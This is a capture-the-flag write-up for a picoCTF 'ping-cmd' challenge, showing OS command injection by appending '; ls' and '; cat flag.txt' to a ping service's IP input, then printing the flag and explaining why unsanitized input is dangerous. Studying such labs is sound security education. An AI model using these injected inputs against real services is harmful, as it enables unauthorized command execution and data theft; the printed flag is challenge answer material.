# ping-cmd
| **Platform** | picoCTF 2026 |
| **Category** | General Skills |
| **Difficulty** | Easy |

## Challenge
The challenge provides a service that accepts an IP address and executes a `ping` command. Although the prompt states that only Google's DNS server (`8.8.8.8`) is allowed, the hints suggest that the application executes a shell command behind the scenes. This makes the challenge vulnerable to **OS Command Injection**.
The objective is to inject an additional command to read the hidden flag.

## Approach
I first connected to the remote service using Netcat.

```bash
nc mysterious-sea.picoctf.net 60744
```
The application prompted me to enter an IP address to ping.
Entering the expected input:
```text
8.8.8.8
```
simply executed the normal `ping` command.
The hints indicated that:
- A shell command is executed behind the scenes.
- More than one command can be executed at once.
This suggested that shell metacharacters such as `;` could be used to execute additional commands.
I first listed the files on the server by appending the `ls` command.
```text
8.8.8.8; ls
```
The output revealed the following files:
```text
flag.txt
script.sh
```
After confirming that `flag.txt` existed, I injected another command to display its contents.
```text
8.8.8.8; cat flag.txt
```
The server first executed the `ping` command and then the injected `cat` command, revealing the flag.

## Commands Used
Connect to the service:
```bash
nc mysterious-sea.picoctf.net 60744
```
List files:
```text
8.8.8.8; ls
```
Read the flag:
```text
8.8.8.8; cat flag.txt
```

## Vulnerability
The application likely executes a command similar to:
```bash
ping -c 2 <user_input>
```
Since the user input is not properly sanitized, shell metacharacters such as `;` allow additional commands to be executed.
Example:
```text
8.8.8.8; cat flag.txt
```
is interpreted as:
```bash
ping -c 2 8.8.8.8
cat flag.txt
```
This is a classic **OS Command Injection** vulnerability.

## Flag
```text
picoCTF{p1nG_c0mm@nd_3xpl0it_su33essFul_17ae04f2}
```

## Tools Used
- Netcat (nc)
- Linux Terminal

## Key Learning
- Learned how **OS Command Injection** occurs when user input is passed directly to shell commands.
- Practiced using shell metacharacters (`;`) to execute multiple commands.
- Learned how to enumerate files before retrieving sensitive data.
- Reinforced the importance of validating and sanitizing user input in applications.
